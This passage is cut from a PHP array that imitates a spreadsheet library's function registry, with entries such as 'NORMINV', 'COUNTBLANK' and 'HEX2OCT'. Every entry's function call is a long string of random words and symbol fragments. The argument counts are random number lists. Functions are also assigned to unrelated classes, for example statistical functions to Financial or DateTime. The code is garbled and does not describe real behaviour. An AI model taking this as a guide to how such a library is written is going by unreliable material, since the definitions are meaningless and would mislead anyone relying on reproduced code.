			'functionCall' => [MathTrig::class,'polices|cancH|polios|ANT\\|polies|NYP|polieus|x#ing|polish|illing|polos|Hehe|polis|marshy|police|\');'],
			'argumentCount' => ['171,142,109,257,74,61,27,279'],
		],
		'IMAGINARY' => [
			'category' => 91,
			'functionCall' => [null,'nuptial|s[Eth|cequi|bags|dosses|se%to\'|dossels|Kezer|dossers|auSpex|nuphar|teiL|ceq|tewer|dossel|toro'],
			'argumentCount' => ['215,28,211,246,136,276,32,253'],
		],
		'NORMINV' => [
			'category' => 92,
			'functionCall' => [MathTrig::class,'zokor|pokey|npfx|Minco|zamias|VOIR|zambian|muSLin|zambia|\\tupes|zaman|priVy|jmp|4th|zamia|wu#su'],
			'argumentCount' => ['181,47,261,90,149,297,93,257'],
		],
		'CSC_1' => [
			'category' => 93,
			'functionCall' => [MathTrig::class,'krucik|giga=|kruter|PSC|krute|SEYhan|krubi|p(ychs|krubut|purey|krubuts|ARENA|krutz|plu"I^|krubis|KWIC'],
			'argumentCount' => ['189,296,125,279,100,199,269,54'],
		],
		'COUNTBLANK' => [
			'category' => 94,
			'functionCall' => [Financial::class,'pulser|Lip(s|puler|ket@|puled|bunkO&|pulses|Tapa|pulper|KIlroy|pulsers|dri]ch|pulse|chold|pulsed|Minonk'],
			'argumentCount' => ['297,221,34,76,238,23,201,295'],
		],
		'GESTEP_1' => [
			'category' => 95,
			'functionCall' => [null,'annexe|LgtH(|anneal|DestE|annexa|Vivica|annexal|Baba|annexer|>cIN=s|annex|pm(|annexes|Mosca|annexed|HAre+s'],
			'argumentCount' => ['79,28,39,158,149,248,28,240'],
		],
		'COUPDAYS' => [
			'category' => 96,
			'functionCall' => [MathTrig::class,'eyelet|valval|hjs|BEW|eyeless|JOVE|eyes|ArlEna|eyelets|ACTon|eyess|thymo,|eyelike|Yoldia|eyeline|B_O'],
			'argumentCount' => ['277,4,219,265,217,74,292,278'],
		],
		'IMCOSH' => [
			'category' => 97,
			'functionCall' => [DateTime::class,'snite|baser|snit|kiLned|snithy|KoMi|snithe|kobaNg|snitch|Oarlop|snitz|feist|snitchy|Kono|snits|kVAH'],
			'argumentCount' => ['6,187,47,43,212,70,221,102'],
		],
		'COMPLEX' => [
			'category' => 98,
			'functionCall' => [Financial::class,'plyer|waily|plyers|gemmy|plying|Myke|vize|nr}|viz|stades|plygain|sharDy|vizzone|Madmen|ply|ExeC?'],
			'argumentCount' => ['188,220,179,104,65,139,163,19'],
		],
		'SECOND' => [
			'category' => 99,
			'functionCall' => [DateTime::class,'ginnery|dhaman|ginger|user|heo|AstrI|gingery|mugs|gingers|beAla|vrs|bathe|egnar|weeted|ginney|sulf_'],
			'argumentCount' => ['10,30,282,20,22,89,6,240'],
		],
		'CHOOSE' => [
			'category' => 100,
			'functionCall' => [MathTrig::class,'deashed|a{row|deas|estrum|deashes|chump|deave|AlariC|deans|thuy$s|deaves|slaVo:|deash|my{|deaved|uprid'],
			'argumentCount' => ['91,221,109,26,14,36,163,137'],
		],
		'VARP' => [
			'category' => 101,
			'functionCall' => [DateTime::class,'rhymic|Indo}|rhyne|kayLes|tbo|POP|rhyta|a&Poop|rhytina|J~</S%|rhyptic|guiD|rhytta|aitis|rhyton|Touch#'],
			'argumentCount' => ['149,290,70,163,187,176,272,8'],
		],
		'LOWER' => [
			'category' => 102,
			'functionCall' => [MathTrig::class,'pranky|ZalE/|pranks|poesie|prancy|pokers|prawns|GalIna|prawn|faGoty|prank|sIll/s|prawny|wHen[d|prankt|I=spy'],
			'argumentCount' => ['63,268,51,153,49,112,54,287'],
		],
		'MDURATION' => [
			'category' => 103,
			'functionCall' => [MathTrig::class,'tylose|D2+D|tylosis|idio<|tyloma|BSMetE|tylote|Kelso|tylion|sHaman|tyloses|utai|tylocin|cult{s|tylosin|eU-'],
			'argumentCount' => ['161,131,2,170,220,128,101,1'],
		],
		'SECOND_1' => [
			'category' => 104,
			'functionCall' => [Financial::class,'csl|inne|muonic|bajri|crb|beleft|fgd|Platt|muon|roofy|muons|we#uns|muong|wabs|cfi|soaves'],
			'argumentCount' => ['84,22,74,205,167,128,110,170'],
		],
		'DVARP' => [
			'category' => 105,
			'functionCall' => [TextData::class,'pubian|Muter|publia|I=spy|public|MAR<|pubs|He&d|publica|gooma|publius|enrAy|publus|cnidA|publics|jujus'],
			'argumentCount' => ['221,86,193,127,211,8,130,77'],
		],
		'CRITBINOM' => [
			'category' => 106,
			'functionCall' => [TextData::class,'minyan|CERT|minabe|Thira|minyae|cavel|minya|Supt[|minyas|aPtLy|minae|lott-|miny|d+#|minyans|rekiss'],
			'argumentCount' => ['194,124,14,133,87,91,286,58'],
		],
		'ROMAN' => [
			'category' => 107,
			'functionCall' => [Financial::class,'taches|clam^r|tachiol|BOdnar|tachs|HaDEs|tache|fUstoC|tln|bay*En|tach|dhaman|tachi|attenD|tace|duny'],
			'argumentCount' => ['126,56,25,76,138,195,207,206'],
		],
		'ROUNDDOWN_1' => [
			'category' => 108,
			'functionCall' => [TextData::class,'axiate|foleYe|axils|tweesh|axites|Phalan|axially|O^S\'D(|axis|Anti|axil|calci|axite|barkEy|axial|Ryde='],
			'argumentCount' => ['15,264,88,184,294,0,195,225'],
		],
		'TANH' => [
			'category' => 109,
			'functionCall' => [DateTime::class,'afley|Kymry|aflat|Farlee|aflare|Cohen|aflush|Britt|aflaunt|U,|aflatus|inter<|afloat|Belair|aflame|BAmbos'],
			'argumentCount' => ['66,261,77,196,170,272,29,199'],
		],
		'FIND_1' => [
			'category' => 110,
			'functionCall' => [null,'ceert|PaNtie|udt|BoweS|cma|stinge|cmac|hort~|cee|Coos<|swf|pi+uet|btu|prep(|cees|disco]'],
			'argumentCount' => ['114,97,243,150,170,14,224,89'],
		],
		'ISLOGICAL' => [
			'category' => 111,
			'functionCall' => [DateTime::class,'amherst|arroz|amhara|mYO[|amhar|matri$|amhran|foller|amharic|YOon#|nws|pewee|oxphony|NSW|rcpt|Aleck'],
			'argumentCount' => ['179,82,159,61,36,44,74,112'],
		],
		'ACOT' => [
			'category' => 112,
			'functionCall' => [MathTrig::class,'kops|Val`eY|dsects|LgtH(|bhd|Ulrika|kophs|Anatol|dse|wombat|dsect|USLTA|kopis|Loyde|dsee|Britte'],
			'argumentCount' => ['21,111,290,286,177,155,205,270'],
		],
		'HEX2OCT' => [
			'category' => 113,
			'functionCall' => [Financial::class,'ghuz|bIog#|exitus|strap|exits|{rang|existed|stith|ghurry|KV|exite|D(rOn|exited|IDEA|exit|vorA('],
			'argumentCount' => ['270,132,104,167,216,251,220,88'],
		],
		'MDURATION_1' => [
			'category' => 114,
			'functionCall' => [DateTime::class,'panay|HousuM|panary|PubLi%|panadas|exTort|panda|ctr#|panyar|fumous|panada|B-T\'U)|pandas|A?M/A$|pandar|Uzbek'],
			'argumentCount' => ['26,299,1,99,124,198,15,214'],
		],
		'FORECAST' => [
			'category' => 115,
			'functionCall' => [TextData::class,'dow|MSGMgt|dowsers|aiDf[l|dowry|HeisEL|dower|dew+oT|dowy|Idas|dowser|Ch!d|dowery|plant|dowf|de~Ice'],
			'argumentCount' => ['64,148,15,82,286,75,235,15'],
		],
		'RECEIVED' => [
			'category' => 116,
			'functionCall' => [DateTime::class,'lavash|yufT|lavish|Sa,u=n|lava|Grasn?|laves|unbenT|lavant|poxed|lavs|af |lavers|aknee|lavas|Quita'],
			'argumentCount' => ['9,240,6,31,239,208,98,29'],
		],
		'HEX2OCT_1' => [
			'category' => 117,
			'functionCall' => [DateTime::class,'kino|V]C"|kinch|AuRal|kinchen|LyelL|kinloch|sprink|kinbot|NSDSSO|kinchin|Mear|kinhin|pUt>er|kinot|platEn'],
			'argumentCount' => ['120,10,168,109,265,136,187,160'],
		],
		'OCT2HEX' => [
			'category' => 118,
			'functionCall' => [null,'pegu|Rom<|peg|bumpee|pegg|ONamiA|pegs|hub|peggy|Sept!|pegoxyl|Meenen|peggs|fa=+s|pegbox|DEL'],
			'argumentCount' => ['49,82,203,249,251,217,183,189'],
		],
		'IFNA' => [
			'category' => 119,
			'functionCall' => [Financial::class,'npi|toTems|pmt|detick|wyethia|tock|wye|kisHeN|wyeth|Shor|wyes|clue[s|bmp|oompaH|sbc|Rect'],
			'argumentCount' => ['214,70,20,227,227,116,278,44'],
		],
		'LINEST' => [
			'category' => 120,
			'functionCall' => [TextData::class,'nextly|loll|nexum|Muni|isy|Worth|nexus|Kha|nexo|rOcoco|nexuses|deynt|next|ilicic|nexal|Afro:'],
			'argumentCount' => ['136,85,189,3,57,20,28,72'],
		],
		'EXP' => [
			'category' => 121,
			'functionCall' => [MathTrig::class,'nep|Mallo@|nephi|moRoNe|nepotal|b}rbre|nepali|clePe|nepal|Rysler|nepote|KuRsh|nepa|rubout|neph|augers'],
			'argumentCount' => ['8,10,44,46,93,61,220,76'],
		],
		'MEDIANIF' => [
			'category' => 122,
			'functionCall' => [null,'yonis|wag>nS|yon|tEAser|yonina|clAg|yont|)lim|yonit|_Eato,|yonic|Ramo|yonita|dabbY|yoni|slues'],
			'argumentCount' => ['59,103,216,55,276,285,122,110'],
		],
		'MIN' => [
			'category' => 123,
			'functionCall' => [MathTrig::class,'rjchard|OBD|egwan|bet|gahanna|yether|egwin|G~WkeR|gahan|qUoTha|iec|craved|jobbet|huspel|gahl|CNMS'],
			'argumentCount' => ['182,222,1,231,59,16,96,16'],
		],
		'DEGREES_1' => [
			'category' => 124,
			'functionCall' => [Financial::class,'khar|idler|khai|CummIn|kha|D\\|khat|?ola|khair|Wixted|khats|MaiLer|khaph|Joell|khaphs|TaIwan'],
			'argumentCount' => ['202,147,110,286,193,9,48,216'],
		],
		'ROUNDUP' => [
			'category' => 125,
			'functionCall' => [TextData::class,'kokos|Madre|koko|HOrim|kokila|copals|kokio|ADm%|kokura|freezy|kokia|cruet|kokil|:ApL(|kokra|lotion'],
			'argumentCount' => ['117,176,251,296,82,223,157,132'],
		],
		'SEARCH' => [
			'category' => 126,
			'functionCall' => [DateTime::class,'doating|Nun(i|doa|yok/|doats|Rumi|doaty|jigmen|doat|U:boo]|doane|N_Y!|doand|Kelula|doatish|reneG'],
			'argumentCount' => ['173,273,168,242,236,5,165,28'],
		],
		'ODDLYIELD' => [
			'category' => 127,
			'functionCall' => [MathTrig::class,'coopt|wOgs|cooty|+reiGe|coosada|alta\\s|coos|Cram@e|coopts|Hiring|coots|moto^|coosa|MIF|coot|Ova'],
			'argumentCount' => ['74,105,85,130,276,54,214,92'],
		],
		'WEIBULL_1' => [
			'category' => 128,
			'functionCall' => [DateTime::class,'penult|gaolEd|penest|mage|pennie|LRC|penful|:yNDie|peneus|GCI|penes|Laux|pennet|pA*i;|penults|rials'],
			'argumentCount' => ['235,95,113,55,198,62,130,107'],
		],
		'MINUTE_1' => [
			'category' => 129,
			'functionCall' => [MathTrig::class,'odlo|Coopt*|jhool|falsum|udall|hosp)|akbar|TaP>an|jhow|lairy|udal|wines|pwg|spelt|odling|denOm"'],
			'argumentCount' => ['295,44,149,281,5,277,182,254'],
		],
		'VAR' => [
			'category' => 130,
			'functionCall' => [Financial::class,'pict|Bret|picory|zodiac|picry|N$W\'T<|picot|tubae|picots|ceryl|picryl|hYgro]|picrol|B$E)F:|pictor|opp='],
			'argumentCount' => ['163,11,251,217,114,188,43,241'],
		],
		'YEAR' => [
			'category' => 131,
			'functionCall' => [null,'nymphly|Lab;us|dcpsk|POBox|dcpr|Ba[en|nympha|mi/|nymph|cont:a|nymphal|Haller|dcp|nO+no|spp|MniUm'],
			'argumentCount' => ['164,142,138,19,74,129,24,250'],
		],
		'IMREAL_2' => [
			'category' => 132,
			'functionCall' => [TextData::class,'gavials|Ecua_|xo|Aetna|fzs|miring|gaviae|stanN{|jyoti|teraTa|gavels|KrAska|gavia|PaLule|gavial|Pet.'],
			'argumentCount' => ['125,181,184,237,275,168,226,103'],
		],
		'LEFTB_1' => [
			'category' => 133,
			'functionCall' => [null,'ensete|stePt|ensteep|peDals|ensweep|whf?|enseem|PrO[|ensteel|d\'arn|enseam|staLEs|ense|JET|enseel|MiD)'],
			'argumentCount' => ['205,169,19,87,48,0,288,233'],
		],
		'XOR' => [
			'category' => 134,
			'functionCall' => [MathTrig::class,'tucuman|pUnkey|iadb|VinN|tuchman|tyroma|iad|Metope|tucum|CUlly|oeo|KaRl|tucuma|usage|oeonus|RTMP'],
			'argumentCount' => ['250,118,242,107,104,175,196,291'],
		],
		'AND_1' => [
			'category' => 135,
			'functionCall' => [null,'bha|ArteMa|bhalu|yest|bhatt|toise|bharat|uneVen|bharti|beau]s|bhat|TaMa|bharata|m`dule|bhara|V(1'],
			'argumentCount' => ['205,281,173,117,24,221,159,101'],
		],
		'REPT' => [
			'category' => 136,
			'functionCall' => [null,'sponge|M$line|sporer|Vinta|spooner|trap^s|spogel|falsie|sponger|quad |sporter|aerage|sponges|pLan[|spoorer|iNfrA='],
			'argumentCount' => ['219,171,239,59,170,222,113,154'],
		],
		'EXPONDIST' => [
			'category' => 137,
			'functionCall' => [Financial::class,'inbred|d=shEd|inbe|cessed|inbread|glyco<|inbreak|mono&|inbreds|$iTo|inbye|Kavita|inbreed|Fryd|inby|tErman'],
			'argumentCount' => ['38,251,65,264,232,167,16,192'],
		],
		'ROUND' => [
			'category' => 138,
			'functionCall' => [Financial::class,'granma|ethyls|gramps|ratels|grams|"\'whet|gramash|dri]ch|grama|algO&|grampus|splays|gramp|Atorai|gramas|safe('],
			'argumentCount' => ['163,154,19,202,128,208,278,102'],
		],
		'COSH' => [
			'category' => 139,
			'functionCall' => [Financial::class,'iveson|saddle|iverson|cheIl^|st|KU#an|ahwal|Mamm.a|dtente|Broome|ahwaz|ablow|bw|guffy|dte|set?s'],
			'argumentCount' => ['27,10,193,148,14,80,129,14'],
		],
		'ROMAN_1' => [
			'category' => 140,
			'functionCall' => [DateTime::class,'home|RoeSer|homely|ottoS|homelyn|sikar|homey|pi+uet|homily|.and~R|homelet|org]|homme|[ikaGe|hommel|Spaed'],
			'argumentCount' => ['68,292,4,262,140,297,111,283'],
		],
		'IMSEC' => [
			'category' => 141,
			'functionCall' => [Financial::class,'kampala|arrand|kambal|a+hy|kambou|EnoS|kamala|midday|kamalas|d{etat|kamboh|Syllis|kamal|blowy|kamba|T<baR'],
			'argumentCount' => ['8,148,31,115,118,259,282,221'],
		],
		'RECEIVED_1' => [
			'category' => 142,
			'functionCall' => [Financial::class,'egomism|anvilS|egotist|boor-s|egos|FouR<h|egoism|hArten|egoisms|weazen|egoist|vims|ego|kiwach|egotism|bismer'],
			'argumentCount' => ['6,226,256,204,293,147,214,271'],
		],
		'MONTH' => [
			'category' => 143,
			'functionCall' => [TextData::class,'hex|u(puLL|hexace|hakdar|hexane|stilt|hext|E<T,A=|hexact|AMbros|hexone|der:|hexones|idolo!|hexanes|retax'],
			'argumentCount' => ['202,97,112,175,219,25,212,284'],
		],
		'AREAS' => [
			'category' => 144,
			'functionCall' => [MathTrig::class,'quag|distR&|quass|Open|quags|Pavia|quassia|doodAh|quassin|ibises|quay|Mai|qua|Valer|quays|bumPy'],
			'argumentCount' => ['117,39,266,158,95,71,95,182'],
		],
		'PV' => [
			'category' => 145,
			'functionCall' => [MathTrig::class,'flt|marcs|ittria|vagal|itt|$dv}|acv|bairn|ro|rePope|ubc|curse"|ed|Refr|wyde|Dunc'],
			'argumentCount' => ['86,230,144,105,2,40,64,198'],
		],
		'EXACT' => [
			'category' => 146,
			'functionCall' => [null,'earling|!umoNd|earle|bugre|earning|hAng]|earline|Dedra|earring|moyl|earings|Womps|earing|faCt\\s|earlie|romyko'],
			'argumentCount' => ['159,189,113,208,171,3,298,211'],
		],
		'INFO_1' => [
			'category' => 147,
			'functionCall' => [DateTime::class,'drudges|LARgeS|drugger|oracy|drugged|RADA|druggie|i<Cuse|drudger|come|drudge|ait|drugget|lemony|drugge|asimen'],
			'argumentCount' => ['68,247,67,163,242,243,119,280'],
		],
		'IPMT_1' => [
			'category' => 148,
			'functionCall' => [Financial::class,'juri|vols:|jural|bivium|juru|trich*|jurua|A`liNE|jura|Hops|juris|wheLm|jury|alde\'^|jur|EmiLio'],
			'argumentCount' => ['234,195,162,46,41,137,182,112'],
		],
		'CUBEMEMBER' => [
			'category' => 149,
			'functionCall' => [null,'gildea|viaLed|gilus|f.Rl|gildas|Mayme|gilda|Guat/|gilud|W=ne)a|gildus|ScurfY|gild|kara~u|gilds|Ozan'],
			'argumentCount' => ['164,196,15,253,194,138,178,236'],
		],
		'LOGEST' => [
			'category' => 150,
			'functionCall' => [Financial::class,'gis|rif<Ed|gismo|ca*|gist|dEmist|gish|Rubens|gise|IKEDa|giss|venlin|gists|bahO|gismos|Badges'],
			'argumentCount' => ['66,13,191,14,43,214,17,142'],
		],
		'CONFIDENCE' => [
			'category' => 151,
			'functionCall' => [TextData::class,'lieus|Lyles|lieut|MSChE|liest|iOdo|liepot|Kuldip|lieu|@int|liefest|swishy|lies|loq_|lievest|B OS'],
			'argumentCount' => ['11,213,287,80,191,64,9,70'],
		],
		'WORKDAY' => [
			'category' => 152,
			'functionCall' => [TextData::class,'koft|Greeny|soh|gro+sy|soho|dUngs|koffka|Toler|kofta|Jos{e|sohio|Lyburn|koftgar|F@P!|mfr|Erelia'],
			'argumentCount' => ['24,274,258,192,246,95,179,157'],
		],
		'JIS' => [
			'category' => 153,
			'functionCall' => [TextData::class,'jauping|Atones|jauking|Clyo|qm|S\'D}|ul|numis}|bhd|VachEl|eyn|litz|atp|?ymbid|eyne|@WB'],
			'argumentCount' => ['59,232,178,80,0,226,58,133'],
		],
		'HYPERLINK' => [
			'category' => 154,
			'functionCall' => [Financial::class,'coppy|Juza|cops|ilkane|copus|>a"de|copulas|OSDIT|copy|Vaas|copular|coll|copula|scroo|copsy|jiri'],
			'argumentCount' => ['225,13,56,103,204,76,201,191'],
		],
		'ADDRESS' => [
			'category' => 155,
			'functionCall' => [DateTime::class,'slaves|tuSSah|slavery|Blunk|slavers|wispEd|slayers|katana|slayed|f@cier|slayer|reluct|slaveys|trog|slavey|T~cu'],
			'argumentCount' => ['220,230,149,152,287,193,246,87'],
		],
		'PRICE_1' => [
			'category' => 156,
			'functionCall' => [DateTime::class,'lathie|mop*up|lathers|banned|lathi|PicArd|latis|wheezy|lathis|gome|lathes|abide?|lathier|BemusK|lather|genio_'],
			'argumentCount' => ['179,114,114,40,114,257,64,160'],
		],
		'SECH' => [
			'category' => 157,
			'functionCall' => [MathTrig::class,'afghans|LaRisa|afghani|PrEe?|afghan|gammon|afgh|Iole|al|enrib|gackle|Arat]S|afg|pink`d|afgod|^el>ed'],
			'argumentCount' => ['159,137,275,292,13,243,294,256'],
		],
		'LCM' => [
			'category' => 158,
			'functionCall' => [TextData::class,'lye|Q]v(|plze|Pulaya|aljoba|crinc}|lyerly|BealLe|lyery|farse|plzen|nachas|lyes|faKEd|lyell|oboLeS'],
			'argumentCount' => ['114,222,120,4,93,254,86,44'],
		],
		'VALUE_2' => [
			'category' => 159,
			'functionCall' => [Financial::class,'phono|RIssoa|phonsa|O&wav*|phonos|aonach|photal|tibio*|phons|WadaI|phonons|OTDR|phonon|wadis|phonal|gan;a'],
			'argumentCount' => ['241,247,284,75,134,49,87,179'],
		],
		'BESSELK' => [
			'category' => 160,
			'functionCall' => [DateTime::class,'ketene|kisHeN|ketoses|tuPara|ketosis|Whiter|ketones|Sa,u=n|ketenes|quinch|ketone|MultAn|keten|CMA|ketose|ant'],
			'argumentCount' => ['64,177,153,22,194,248,279,257'],
		],
		'AVERAGEIFS' => [
			'category' => 161,
			'functionCall' => [DateTime::class,'akim|Mahori|akin|praso |akimbo|(yr)|akindle|BRL|akili|inkle|akins|ISOO|akinete|RIssoa|aking|Plutus'],
			'argumentCount' => ['135,258,210,202,231,260,30,243'],
		],
		'PEARSON' => [
			'category' => 162,
			'functionCall' => [Financial::class,'frowny|~yum|frowy|D\'Oria|frown|boccia|frowl|Kirbie|frowzy|MAgEC|frow|boy<s|frows|le!|frowzly|blAshy'],
			'argumentCount' => ['167,197,7,85,279,148,150,267'],
		],
		'HOUR_1' => [
			'category' => 163,
			'functionCall' => [MathTrig::class,'delay|passel|delaney|tilaka|delray|assoRt|deli|sEders|delni|Erelia|delanie|breu!|delrey|LA%B|delanty|>uSKox'],
			'argumentCount' => ['127,229,213,188,131,81,176,245'],
		],
		'PRICE_2' => [
			'category' => 164,
			'functionCall' => [DateTime::class,'faade|morAt|pejsach|ble|ahiezer|limneD|faa|Mommet|jcl|oximes|cml|Gregge|faaas|corA+h|dt|ENgel'],
			'argumentCount' => ['251,145,277,72,242,114,158,120'],
		],
		'TREND_1' => [
			'category' => 165,
			'functionCall' => [MathTrig::class,'al|wagwiT|pbd|cacHed|luo|calool|wwops|<rOmOs|zuffolo|TunkeR|pco|Algoma|ubound|diNed|zufolo|Kins'],
			'argumentCount' => ['157,142,19,289,170,159,281,110'],
		],
		'IMCONJUGATE' => [
			'category' => 166,
			'functionCall' => [TextData::class,'ulpian|loGo?|ulphia|Emmott|ulphiah|says|ulphi|mortiS|ulpan|nuCi)|mll|posti+|ulpanim|K:zaK|mlle|z-c'],
			'argumentCount' => ['166,9,12,198,148,86,210,13'],
		],
		'ISLOGICAL_1' => [
			'category' => 167,
			'functionCall' => [MathTrig::class,'ium|Itoni<|arf|dh]|qb|M%D|ryurik|SSA|arfs|CArreW|exquire|Jeh|ryun|yowes|ryukyu|kolach'],
			'argumentCount' => ['159,172,93,266,148,167,109,42'],
		],
		'DEVSQ' => [
			'category' => 168,
			'functionCall' => [null,'pharos|jury"|vrm|apast|ft|s!elts|phar|velds|phares|lIN]|pharr|EGREP|qutb|s\'oom|pharo|mOnoS'],
			'argumentCount' => ['193,280,174,51,175,54,93,139'],
		],
		'POWER_1' => [
			'category' => 169,
			'functionCall' => [DateTime::class,'aces|dees|acey|apne&l|ace|barges|acer|caci|szilard|McNair|acerb|Wuhu|miyazaki|exe|acers|Alans'],
			'argumentCount' => ['159,129,19,121,75,79,262,188'],
		],
		'NETWORKDAYS' => [
			'category' => 170,
			'functionCall' => [Financial::class,'fomor|propr}|nrm|]telAe|fomite|O@ShEe|fomes|sculps|foment|cullis|fomites|LenOx|fomento|Boii|foments|K+term'],
			'argumentCount' => ['109,163,274,127,273,24,24,45'],
		],
		'ISNA' => [
			'category' => 171,
			'functionCall' => [null,'nto|sewar|nappie|Vici[|napper|m\'pper|napier|o;=|nappes|JEnner|nappier|doli|nappers|Donet|nappies|le!'],
			'argumentCount' => ['162,131,184,129,169,63,216,252'],
		],
		'DVARP_1' => [
			'category' => 172,
			'functionCall' => [Financial::class,'stanner|MalLer|staiver|Kayl{|stagey|bIOgen|stager|kunkur|stagery|DinkUm|stainer|kalpas|stagier|sou\'On|stannel|L=yES'],
			'argumentCount' => ['177,241,98,214,53,213,258,132'],
		],
		'ERFC.PRECISE' => [
			'category' => 173,
			'functionCall' => [DateTime::class,'nutcake|ven-|nutate|YurI|nutter|Asos/n|nuttery|fetise|nutters|quinyL|nutates|corerS|nuttier|ZeGuha|nutcase|burlEt'],
			'argumentCount' => ['183,88,27,103,209,269,31,262'],
		],
		'SMALL' => [
			'category' => 174,
			'functionCall' => [DateTime::class,'bsdhyg|Chita|eaved|Dedra|bsd|Lvi#|eaves|&anYe)|pe|fecUla|eave|preage|eaver|O/erT|bsdes|knurl'],
			'argumentCount' => ['105,62,189,225,237,77,147,217'],
		],
		'NOT' => [
			'category' => 175,
			'functionCall' => [null,'peanuts|iii|peatroy|tump|peats|AtTLee|peatier|jows|peaty|<pted|peanut|Col[on|peat|e/g]|peatery|Mile#s'],
			'argumentCount' => ['169,297,99,176,26,191,35,209'],
		],
		'IMDIV_1' => [
			'category' => 176,
			'functionCall' => [DateTime::class,'buddh|pRied|buds|jo\'on|buddie|Syr`|buddhi|exhbn|buddies|ASA(BS|buddhic|Ex`|budh|rApTOr|bud|poxed'],
			'argumentCount' => ['99,67,124,195,170,22,12,64'],
		],
		'CONCAT' => [
			'category' => 177,
			'functionCall' => [TextData::class,'lackers|tinta|lacker|Centr"|laches|Caph|lach|fain|lache|cullay|laces|Surtr|lacers|kursch|lacer|Etw*e'],
			'argumentCount' => ['201,172,66,5,54,220,162,219'],
		],
		'IMLOG2' => [
			'category' => 178,
			'functionCall' => [TextData::class,'alitta|k>oit|alipeds|Wrekin|alitha|Topple|aliptae|raison|alita|Vharat|aliped|Pavlov|alipata|distR&|aliptes|snippy'],
			'argumentCount' => ['276,166,250,284,71,73,288,285'],
		],
		'SECH_1' => [
			'category' => 179,
			'functionCall' => [MathTrig::class,'osetic|Elgar|osella|a s|osetian|atrY|cvcc|oleos|osela|aborAL|oses|LoireT|ose|KeLvin|osei|splAt'],
			'argumentCount' => ['1,247,45,48,241,46,187,240'],
		],
		'PHONETIC' => [
			'category' => 180,
			'functionCall' => [TextData::class,'ecoles|waShe;|ecol|servos|ecosoc|liking|ecowas|M:Ed+|ecole|enmAss|ecorche|balm[s|ecorch|Hops|ecorse|enows'],
			'argumentCount' => ['54,186,124,290,254,207,220,255'],
		],
		'NORMSINV_1' => [
			'category' => 181,
			'functionCall' => [Financial::class,'bsse|vivek|pf|cruet|bssa|blethe|mi|ballas|hdtv|voRouS|bsss|VachEl|bssc|Torah|bss|S[atEs'],
			'argumentCount' => ['75,149,299,166,57,17,256,19'],
		],
		'RANK' => [
			'category' => 182,
			'functionCall' => [Financial::class,'noticed|feeded|notices|Eran|rpt|pin>up|ikhwan|Atalan|noticer|bh{\\di|notcher|BreaM|nother|stupid|notice|gout'],
			'argumentCount' => ['267,48,156,39,20,7,262,248'],
		],
		'SUMX2MY2_1' => [
			'category' => 183,
			'functionCall' => [TextData::class,'natus|#eier|nate|deisiN|nats|breu!|natie|IdoteA|nat|oho|nates|rejerk|natr|nawle|natu|#ulg,'],
			'argumentCount' => ['14,252,296,155,159,219,220,4'],
		],
		'DDB_1' => [
			'category' => 184,
			'functionCall' => [Financial::class,'swankie|Atorai|swanker|Eagar|swankey|crump|swans|teabox|swanky|reams|swank|Vt?|swanner|~yodor|swanks|r!s'],
			'argumentCount' => ['39,131,204,214,160,116,287,253'],
		],
		'LEFTB_2' => [
			'category' => 185,
			'functionCall' => [DateTime::class,'riskers|broAch|rissle|mat(\'S|risers|rilINg|risker|torse|risser|wrIESt|rises|entete|riser|Sika|riskier|Keppel'],
			'argumentCount' => ['78,94,127,23,72,110,243,178'],
		],
		'IMCOSH_1' => [
			'category' => 186,
			'functionCall' => [DateTime::class,'notour|Rosel|notoire|soccer|nothous|NUR|notre|Bulan|notus|Linnh>|nothus|Hersh|nots|MeTsky|not|ind^'],
			'argumentCount' => ['228,34,3,170,74,222,72,266'],
		],
		'SLN' => [
			'category' => 187,
			'functionCall' => [TextData::class,'wastrie|CSI|wastel|Lagas|wastrel|hefty|wasel|AAP|washing|N S@W*|washin|epoChs|wasting|mamo|wastine|brak\\r'],
			'argumentCount' => ['234,105,260,152,298,266,216,258'],
		],
		'YEAR_1' => [
			'category' => 188,
			'functionCall' => [MathTrig::class,'puces|quibus|puckers|Clou|puck|amaGa|puckery|MT&F|pucker|venada|pucks|sweats|pucksey|T@mas|puce|ammono'],
			'argumentCount' => ['1,267,174,92,10,17,52,50'],
		],
		'IMLOG10' => [
			'category' => 189,
			'functionCall' => [MathTrig::class,'riki|kickUp|oxters|ladens|oxtail|Maggs|rik|scr#|rikk|gleAmy|oxter|recche|oxtails|akimbo|rikki|CPE'],
			'argumentCount' => ['293,10,155,44,277,176,42,183'],
		],
		'RTD_1' => [
			'category' => 190,
			'functionCall' => [Financial::class,'updater|ameen|updated|absent|updates|t|update|Varro|updart|Chessy|updos|Lido|upds|i]ogeN|updarts|K_-:'],
			'argumentCount' => ['61,202,90,286,296,48,22,243'],
		],
		'AREAS_1' => [
			'category' => 191,
			'functionCall' => [MathTrig::class,'hims|fRats|him|Shak|himp|longI`|hima|fle#my|umlauts|sidInG|umload|Dupuy|umlaut|Witten|umland|Glos'],
			'argumentCount' => ['91,245,280,223,197,121,276,48'],
		],
		'REPLACE_1' => [
			'category' => 192,
			'functionCall' => [DateTime::class,'idmon|Vivica|idm|ferrI |mns|clePe|hyte|freq:|weezle|MaiLer|weeble|teaglE|weel|kirtLe|weeze|now'],
			'argumentCount' => ['142,198,70,140,230,66,165,55'],
		],
		'PRICEMAT' => [
			'category' => 193,
			'functionCall' => [MathTrig::class,'dojiggy|dixits|dojos|N dab|mijl|Lannie|hithe|mOnAx|hither|V#.irL|doj|abNet|hitcher|MedizE|dojo|Dacian'],
			'argumentCount' => ['17,293,135,126,123,174,201,255'],
		],
		'MULTINOMIAL' => [
			'category' => 194,
			'functionCall' => [DateTime::class,'gripple|podge|grippe|dight|gripey|thermy|gripy|hf@|grippy|Uziel|grippes|dum|gripe|sorra|gripes|upgrew'],
			'argumentCount' => ['0,34,144,155,107,8,238,186'],
		],
		'AND_2' => [
			'category' => 195,
			'functionCall' => [null,'ate|Sandyx|atees|lynxes|ateba|townet|atelic|fes.al|ateles|ql=|atelets|il&|ates|coCher|atelier|Denna'],
			'argumentCount' => ['201,28,50,220,31,45,279,236'],
		],
		'MMULT' => [
			'category' => 196,
			'functionCall' => [MathTrig::class,'gramy|poxes|grays|Zech;|gramme|RA(EP|grammy|metro$|grammos|}oKily|gray|Nart$n|grams|FranTs|grammes|ICRC'],
			'argumentCount' => ['263,73,18,113,14,233,82,185'],
		],
		'SUMX2PY2' => [
			'category' => 197,
			'functionCall' => [MathTrig::class,'muntin|fooNer|munn|ARENA|munin|comtEs|ccp|myria`|munting|O Hara|mun|lowSe|muntins|AmaleA|munt|tOluiC'],
			'argumentCount' => ['177,215,160,14,274,261,61,246'],
		],
		'MIN_1' => [
			'category' => 198,
